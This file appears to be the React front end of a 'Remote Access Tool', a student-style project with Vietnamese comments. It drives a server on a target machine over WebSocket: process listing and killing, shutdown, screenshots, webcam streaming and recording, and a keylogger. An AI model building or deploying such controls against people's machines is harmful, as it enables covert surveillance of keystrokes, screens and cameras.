import React, { useState, useEffect } from 'react';
import './App.css';

const App = () => {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [targetIP, setTargetIP] = useState('');
  const [wsPort, setWsPort] = useState('9002');
  const [isConnected, setIsConnected] = useState(false);
  const [ws, setWs] = useState(null);
  const [logs, setLogs] = useState([]);
  const [activeTab, setActiveTab] = useState('process');
  const [processInput, setProcessInput] = useState('');
  const [appInput, setAppInput] = useState('');
  
  // Media states
  const [screenshotData, setScreenshotData] = useState(null);
  const [webcamFrame, setWebcamFrame] = useState(null);
  const [isStreaming, setIsStreaming] = useState(false);
  const [recordingData, setRecordingData] = useState(null);
  const [isRecording, setIsRecording] = useState(false);
  const [recordCountdown, setRecordCountdown] = useState(0);
  const [isConverting, setIsConverting] = useState(false);
  
  // Process list state
  const [processList, setProcessList] = useState([]);

  // Load saved connection info from localStorage
  useEffect(() => {
    const savedIP = localStorage.getItem('targetIP');
    const savedPort = localStorage.getItem('wsPort');
    
    if (savedIP) setTargetIP(savedIP);
    if (savedPort) setWsPort(savedPort);
  }, []);

  // Thêm log vào danh sách
  const addLog = (message, type = 'info') => {
    const timestamp = new Date().toLocaleTimeString();
    setLogs(prev => [...prev, { timestamp, message, type }]);
  };

  // Kết nối WebSocket
  const handleConnect = () => {
    if (!targetIP) {
      alert('Vui lòng nhập địa chỉ IP!');
      return;
    }

    // Save to localStorage
    localStorage.setItem('targetIP', targetIP);
    localStorage.setItem('wsPort', wsPort);

    try {
      const wsUrl = `ws://${targetIP}:${wsPort}`;
      const websocket = new WebSocket(wsUrl);

      websocket.onopen = () => {
        setIsConnected(true);
        setIsLoggedIn(true);
        addLog(`Kết nối thành công tới ${wsUrl}`, 'success');
      };

      websocket.onmessage = (event) => {
        try {
          const data = JSON.parse(event.data);
          
          // Xử lý các loại response từ server
          if (data.type === 'ACTION_RESULT') {
            addLog(data.msg, 'info');
          } 
          else if (data.type === 'LIST_RESULT') {
            const processList = data.data;
            setProcessList(processList);
            let logMsg = `Nhận ${processList.length} tiến trình`;
            addLog(logMsg, 'success');
          }
          else if (data.type === 'KEYLOG_RESULT') {
            addLog(`Keylog: ${data.data}`, 'info');
          }
          else if (data.type === 'SCREENSHOT_RESULT') {
            setScreenshotData(data.data);
            addLog('Screenshot nhận thành công! Xem trong tab Media.', 'success');
          }
          else if (data.type === 'CAM_FRAME') {
            setWebcamFrame(data.data);
            addLog('Webcam frame cập nhật', 'info');
          }
          else if (data.type === 'RECORD_RESULT') {
            setIsRecording(false);
            setRecordCountdown(0);
            setIsConverting(true);
            addLog('Đang chuyển đổi video AVI sang MP4...', 'info');
            
            // Convert AVI to MP4
            fetch('/convert-video', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ video_data: data.data })
            })
            .then(res => res.json())
            .then(result => {
              setIsConverting(false);
              if (result.error) {
                addLog(`Lỗi convert: ${result.error}`, 'error');
                // Fallback: download AVI
                const link = document.createElement('a');
                link.href = 'data:video/avi;base64,' + data.data;
                link.download = `webcam_${Date.now()}.avi`;
                link.click();
                addLog('Đã tải xuống video AVI (không convert được)', 'warning');
              } else {
                setRecordingData(result.mp4_data);
                setIsStreaming(false);
                addLog('Video đã được chuyển đổi sang MP4!', 'success');
              }
            })
            .catch(err => {
              setIsConverting(false);
              addLog(`Lỗi API: ${err.message}`, 'error');
              // Fallback: download AVI
              const link = document.createElement('a');
              link.href = 'data:video/avi;base64,' + data.data;
              link.download = `webcam_${Date.now()}.avi`;
              link.click();
            });
          }
          else {
            addLog(`Nhận: ${JSON.stringify(data)}`, 'info');
          }
        } catch (error) {
          addLog(`Lỗi parse JSON: ${event.data}`, 'error');
        }
      };

      websocket.onerror = (error) => {
        addLog('Lỗi kết nối WebSocket', 'error');
        setIsConnected(false);
      };

      websocket.onclose = () => {
      setIsConnected(false);
      setIsLoggedIn(false);
      setIsStreaming(false);
      setWebcamFrame(null);
      setIsRecording(false);
      setRecordCountdown(0);
      setIsConverting(false);
      addLog('Ngắt kết nối', 'warning');
    };      setWs(websocket);
    } catch (error) {
      addLog(`Lỗi: ${error.message}`, 'error');
    }
  };

  // Ngắt kết nối
  const handleDisconnect = () => {
    if (ws) {
      ws.close();
      setWs(null);
      setIsConnected(false);
      setIsLoggedIn(false);
      setIsStreaming(false);
      setWebcamFrame(null);
      setScreenshotData(null);
      setRecordingData(null);
      setIsRecording(false);
      setRecordCountdown(0);
      setIsConverting(false);
      addLog('Đã ngắt kết nối', 'info');
    }
  };

  // Gửi lệnh
  const sendCommand = (cmd, args = {}) => {
    if (!isConnected || !ws) {
      addLog('Chưa kết nối tới server!', 'error');
      return;
    }
    
    // Tạo JSON object với cmd và các tham số
    const payload = { cmd, ...args };
    const jsonString = JSON.stringify(payload);
    
    ws.send(jsonString);
    addLog(`Gửi: ${cmd}`, 'success');
  };

  // Xóa logs
  const clearLogs = () => {
    setLogs([]);
  };

  // Kill process
  const handleKillProcess = () => {
    const target = processInput.trim();
    if (!target) {
      addLog('Vui lòng nhập PID hoặc tên tiến trình!', 'error');
      return;
    }

    if (isNaN(target)) {
      // Nếu là tên
      sendCommand('KILL_PROC', { proc_name: target });
      addLog(`Đang diệt tiến trình: ${target}`, 'info');
    } else {
      // Nếu là PID
      sendCommand('KILL_PROC', { pid: target });
      addLog(`Đang diệt PID: ${target}`, 'info');
    }
    setProcessInput('');
    
    // Auto refresh after 1 second
    setTimeout(() => {
      if (processList.length > 0) {
        sendCommand('LIST_PROC');
      }
    }, 1000);
  };

  // Start app
  const handleStartApp = () => {
    const name = appInput.trim();
    if (!name) {
      addLog('Vui lòng nhập tên ứng dụng!', 'error');
      return;
    }
    sendCommand('START_PROC', { name: name });
    addLog(`Đang khởi chạy: ${name}`, 'info');
    setAppInput('');
  };

  // Download handlers
  const downloadScreenshot = () => {
    if (!screenshotData) return;
    const link = document.createElement('a');
    link.href = 'data:image/jpeg;base64,' + screenshotData;
    link.download = `screenshot_${Date.now()}.jpg`;
    link.click();
    addLog('Đã tải xuống screenshot', 'success');
  };

  const downloadRecording = () => {
    if (!recordingData) return;
    const link = document.createElement('a');
    link.href = 'data:video/mp4;base64,' + recordingData;
    link.download = `recording_${Date.now()}.mp4`;
    link.click();
    addLog('Đã tải xuống video MP4', 'success');
  };

  // Kill process by PID (quick action)
  const quickKillPID = (pid) => {
    if (window.confirm(`Bạn có chắc muốn diệt tiến trình PID: ${pid}?`)) {
      sendCommand('KILL_PROC', { pid: pid.toString() });
      addLog(`Đang diệt PID: ${pid}`, 'info');
      // Auto refresh after 1 second
      setTimeout(() => {
        if (processList.length > 0) {
          sendCommand('LIST_PROC');
        }
      }, 1000);
    }
  };

  // Kill process by name (quick action)
  const quickKillName = (name) => {
    if (window.confirm(`Bạn có chắc muốn diệt TẤT CẢ tiến trình có tên: ${name}?`)) {
      sendCommand('KILL_PROC', { proc_name: name });
      addLog(`Đang diệt tiến trình: ${name}`, 'info');
      // Auto refresh after 1 second
      setTimeout(() => {
        if (processList.length > 0) {
          sendCommand('LIST_PROC');
        }
      }, 1000);
    }
  };

  // Group processes by name
  const groupProcessesByName = () => {
    const grouped = {};
    processList.forEach(proc => {
      // Format: "Name | PID"
      const parts = proc.split(' | ');
      if (parts.length === 2) {
        const name = parts[0].trim();
        const pid = parts[1].trim();
        
        if (!grouped[name]) {
          grouped[name] = [];
        }
        grouped[name].push(pid);
      }
    });
    
    // Sắp xếp theo số lượng PID (nhiều nhất lên đầu)
    const sortedEntries = Object.entries(grouped).sort((a, b) => {
      return b[1].length - a[1].length;
    });
    
    return Object.fromEntries(sortedEntries);
  };

  // Start/Stop webcam stream
  const handleStartWebcam = () => {
    if (!isStreaming) {
      setIsStreaming(true);
      sendCommand('START_CAM');
      addLog('Đang khởi động webcam stream...', 'info');
    }
  };

  const handleStopWebcam = () => {
    if (isStreaming) {
      setIsStreaming(false);
      sendCommand('STOP_CAM');
      setWebcamFrame(null);
      addLog('Đang dừng webcam stream...', 'info');
    }
  };

  // Start recording with countdown
  const handleStartRecording = () => {
    if (isStreaming) {
      addLog('Vui lòng tắt live stream trước khi ghi hình!', 'error');
      return;
    }
    
    setIsRecording(true);
    setRecordCountdown(10);
    sendCommand('RECORD_CAM');
    addLog('Đang ghi hình 10 giây...', 'info');
    
    // Countdown timer
    let countdown = 10;
    const timer = setInterval(() => {
      countdown--;
      setRecordCountdown(countdown);
      
      if (countdown <= 0) {
        clearInterval(timer);
      }
    }, 1000);
  };

  return (
    <div className="app">
      {!isLoggedIn ? (
        // LOGIN PAGE
        <div className="login-container">
          <div className="login-box">
            <div className="login-header">
              <div className="login-icon">🔐</div>
              <h1>Remote Access Tool</h1>
              <p className="login-subtitle">Kết nối đến máy tính từ xa</p>
            </div>

            <div className="login-form">
              <div className="form-group">
                <label>
                  <span className="label-icon">🌐</span>
                  Địa chỉ IP Target
                </label>
                <input
                  type="text"
                  value={targetIP}
                  onChange={(e) => setTargetIP(e.target.value)}
                  placeholder="Ví dụ: 192.168.1.100 hoặc 10.217.40.76"
                  onKeyPress={(e) => e.key === 'Enter' && handleConnect()}
                  autoFocus
                />
              </div>

              <div className="form-group">
                <label>
                  <span className="label-icon">🔌</span>
                  Cổng WebSocket
                </label>
                <input
                  type="text"
                  value={wsPort}
                  onChange={(e) => setWsPort(e.target.value)}
                  placeholder="9002"
                  onKeyPress={(e) => e.key === 'Enter' && handleConnect()}
                />
              </div>

              <button onClick={handleConnect} className="btn btn-login">
                <span className="btn-icon">🚀</span>
                Kết nối ngay
              </button>

              <div className="login-info">
                <p>💡 <strong>Lưu ý:</strong></p>
                <ul>
                  <li>Đảm bảo Server C++ đã chạy trên máy target</li>
                  <li>IP và port phải khớp với cấu hình server</li>
                  <li>Thông tin kết nối sẽ được lưu tự động</li>
                </ul>
              </div>
            </div>

            <div className="login-footer">
              <p>Built with React.js + Flask + WebSocket</p>
            </div>
          </div>
        </div>
      ) : (
        // MAIN DASHBOARD
        <>
          <header className="header">
            <h1>🖥️ Remote Access Tool - Web Client</h1>
            <div className="header-actions">
              <div className="connection-info">
                <span className="connection-badge">
                  <span className={`status-indicator ${isConnected ? 'connected' : 'disconnected'}`}></span>
                  {targetIP}:{wsPort}
                </span>
              </div>
              <button onClick={handleDisconnect} className="btn btn-logout">
                Đăng xuất
              </button>
            </div>
          </header>

          <div className="container">
            {/* Control Panel */}
            <div className="control-panel">
              <div className="tabs">
            <button
              className={`tab ${activeTab === 'process' ? 'active' : ''}`}
              onClick={() => setActiveTab('process')}
            >
              ⚙️ Quản lý tiến trình
            </button>
            <button
              className={`tab ${activeTab === 'system' ? 'active' : ''}`}
              onClick={() => setActiveTab('system')}
            >
              🖥️ Hệ thống
            </button>
            <button
              className={`tab ${activeTab === 'media' ? 'active' : ''}`}
              onClick={() => setActiveTab('media')}
            >
              📸 Media
            </button>
            <button
              className={`tab ${activeTab === 'keylogger' ? 'active' : ''}`}
              onClick={() => setActiveTab('keylogger')}
            >
              ⌨️ Keylogger
            </button>
          </div>

          <div className="tab-content">
            {activeTab === 'process' && (
              <div className="command-section">
                <h3>Quản lý tiến trình</h3>
                
                <div className="section-group">
                  <h4>📋 Xem danh sách</h4>
                  <button 
                    onClick={() => {
                      sendCommand('LIST_PROC');
                      addLog('Đang lấy danh sách tiến trình...', 'info');
                    }} 
                    className="btn btn-command"
                    disabled={!isConnected}
                  >
                    🔄 Lấy danh sách tiến trình
                  </button>
                  
                  {processList.length > 0 && (
                    <div className="process-list-container">
                      <div className="process-list-header">
                        <span>Tìm thấy {processList.length} tiến trình</span>
                        <button 
                          onClick={() => setProcessList([])} 
                          className="btn btn-small"
                        >
                          ✖ Đóng
                        </button>
                      </div>
                      <div className="process-groups">
                        {Object.entries(groupProcessesByName()).map(([name, pids]) => (
                          <div key={name} className="process-group">
                            <div className="process-group-header">
                              <div className="process-name">
                                <span className="process-icon">📦</span>
                                <strong>{name}</strong>
                                <span className="process-count">({pids.length})</span>
                              </div>
                              <button 
                                onClick={() => quickKillName(name)}
                                className="btn btn-kill-group"
                                title={`Diệt tất cả ${name}`}
                              >
                                ❌ Diệt tất cả
                              </button>
                            </div>
                            <div className="process-pids">
                              {pids.map(pid => (
                                <div key={pid} className="process-pid-item">
                                  <span className="pid-label">PID: {pid}</span>
                                  <button 
                                    onClick={() => quickKillPID(pid)}
                                    className="btn btn-kill-pid"
                                    title={`Diệt PID ${pid}`}
                                  >
                                    ✖
                                  </button>
                                </div>
                              ))}
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                </div>

                <div className="section-group">
                  <h4>❌ Diệt tiến trình</h4>
                  <div className="input-group">
                    <input
                      type="text"
                      value={processInput}
                      onChange={(e) => setProcessInput(e.target.value)}
                      onKeyPress={(e) => e.key === 'Enter' && handleKillProcess()}
                      placeholder="Nhập PID (số) hoặc tên tiến trình (vd: notepad.exe)"
                      disabled={!isConnected}
                    />
                    <button 
                      onClick={handleKillProcess} 
                      className="btn btn-danger"
                      disabled={!isConnected}
                    >
                      Diệt tiến trình
                    </button>
                  </div>
                  <p className="help-text">
                    💡 Nhập số để diệt theo PID, hoặc tên để diệt theo tên process
                  </p>
                </div>

                <div className="section-group">
                  <h4>▶️ Khởi chạy ứng dụng</h4>
                  <div className="input-group">
                    <input
                      type="text"
                      value={appInput}
                      onChange={(e) => setAppInput(e.target.value)}
                      onKeyPress={(e) => e.key === 'Enter' && handleStartApp()}
                      placeholder="Nhập tên ứng dụng (vd: notepad, calc, www.google.com)"
                      disabled={!isConnected}
                    />
                    <button 
                      onClick={handleStartApp} 
                      className="btn btn-success"
                      disabled={!isConnected}
                    >
                      Khởi chạy
                    </button>
                  </div>
                  <p className="help-text">
                    💡 Hỗ trợ: tên app (notepad), đường dẫn file, hoặc URL (www.google.com)
                  </p>
                </div>
              </div>
            )}

            {activeTab === 'system' && (
              <div className="command-section">
                <h3>Quản lý hệ thống</h3>
                <div className="command-buttons">
                  <button onClick={() => sendCommand('SYSTEM_CONTROL', { type: 'LOCK' })} className="btn btn-command">
                    Khóa máy 🔒
                  </button>
                  <button onClick={() => sendCommand('SYSTEM_CONTROL', { type: 'SHUTDOWN' })} className="btn btn-danger">
                    Tắt máy
                  </button>
                  <button onClick={() => sendCommand('SYSTEM_CONTROL', { type: 'RESTART' })} className="btn btn-danger">
                    Khởi động lại
                  </button>
                </div>
              </div>
            )}

            {activeTab === 'media' && (
              <div className="command-section">
                <h3>Điều khiển Media</h3>
                
                {/* Screenshot Section */}
                <div className="section-group">
                  <h4>📸 Chụp màn hình</h4>
                  <button 
                    onClick={() => {
                      sendCommand('SCREENSHOT');
                      addLog('Đang yêu cầu chụp màn hình...', 'info');
                    }} 
                    className="btn btn-command"
                    disabled={!isConnected}
                  >
                    Chụp màn hình
                  </button>
                  
                  {screenshotData && (
                    <div className="media-preview">
                      <img 
                        src={`data:image/jpeg;base64,${screenshotData}`} 
                        alt="Screenshot" 
                        className="preview-image"
                      />
                      <div className="preview-actions">
                        <button onClick={downloadScreenshot} className="btn btn-success">
                          💾 Tải xuống ảnh
                        </button>
                        <button 
                          onClick={() => setScreenshotData(null)} 
                          className="btn btn-small"
                        >
                          ✖ Đóng
                        </button>
                      </div>
                    </div>
                  )}
                </div>

                {/* Webcam Section */}
                <div className="section-group">
                  <h4>📹 Webcam Live Stream</h4>
                  <div className="command-buttons">
                    <button 
                      onClick={handleStartWebcam} 
                      className="btn btn-command"
                      disabled={!isConnected || isStreaming}
                    >
                      ▶️ Bật Live Stream
                    </button>
                    <button 
                      onClick={handleStopWebcam} 
                      className="btn btn-danger"
                      disabled={!isConnected || !isStreaming}
                    >
                      ⏹️ Tắt Live Stream
                    </button>
                  </div>
                  
                  {isStreaming && webcamFrame && (
                    <div className="media-preview">
                      <div className="stream-badge">🔴 LIVE</div>
                      <img 
                        src={`data:image/jpeg;base64,${webcamFrame}`} 
                        alt="Webcam Stream" 
                        className="preview-image stream"
                      />
                    </div>
                  )}
                  
                  {isStreaming && !webcamFrame && (
                    <div className="media-preview">
                      <div className="loading-placeholder">
                        <div className="spinner"></div>
                        <p>Đang chờ webcam stream...</p>
                      </div>
                    </div>
                  )}
                </div>

                {/* Recording Section */}
                <div className="section-group">
                  <h4>🎥 Ghi hình Webcam</h4>
                  <button 
                    onClick={handleStartRecording}
                    className="btn btn-command"
                    disabled={!isConnected || isStreaming || isRecording}
                  >
                    {isRecording ? `🎬 Đang ghi... (${recordCountdown}s)` : '🎬 Ghi hình 10 giây'}
                  </button>
                  
                  {isRecording && (
                    <div className="recording-progress">
                      <div className="progress-bar">
                        <div 
                          className="progress-fill" 
                          style={{width: `${((10 - recordCountdown) / 10) * 100}%`}}
                        ></div>
                      </div>
                      <p className="recording-text">
                        ⏱️ Đang ghi hình... {recordCountdown} giây còn lại
                      </p>
                    </div>
                  )}
                  
                  {isConverting && (
                    <div className="recording-progress">
                      <div className="spinner"></div>
                      <p className="recording-text">
                        🔄 Đang chuyển đổi video sang MP4...
                      </p>
                    </div>
                  )}
                  
                  {recordingData && !isRecording && !isConverting && (
                    <div className="media-preview">
                      <video 
                        controls 
                        className="preview-video"
                        key={recordingData}
                      >
                        <source 
                          src={`data:video/mp4;base64,${recordingData}`} 
                          type="video/mp4"
                        />
                        Trình duyệt không hỗ trợ video.
                      </video>
                      <div className="preview-actions">
                        <button onClick={downloadRecording} className="btn btn-success">
                          💾 Tải xuống MP4
                        </button>
                        <button 
                          onClick={() => setRecordingData(null)} 
                          className="btn btn-small"
                        >
                          ✖ Đóng
                        </button>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            )}

            {activeTab === 'keylogger' && (
              <div className="command-section">
                <h3>Keylogger</h3>
                <div className="command-buttons">
                  <button onClick={() => sendCommand('START_KEYLOG')} className="btn btn-command">
                    Reset & Bắt đầu ghi phím
                  </button>
                  <button onClick={() => sendCommand('GET_KEYLOG')} className="btn btn-command">
                    Xem log phím
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Logs Panel */}
        <div className="logs-panel">
          <div className="logs-header">
            <h3>📝 System Logs</h3>
            <button onClick={clearLogs} className="btn btn-small">Xóa</button>
          </div>
          <div className="logs-content">
            {logs.length === 0 ? (
              <p className="no-logs">Chưa có log nào...</p>
            ) : (
              logs.map((log, index) => (
                <div key={index} className={`log-entry log-${log.type}`}>
                  <span className="log-time">[{log.timestamp}]</span>
                  <span className="log-message">{log.message}</span>
                </div>
              ))
            )}
          </div>
        </div>
      </div>
      </>
      )}
    </div>
  );
};

export default App;
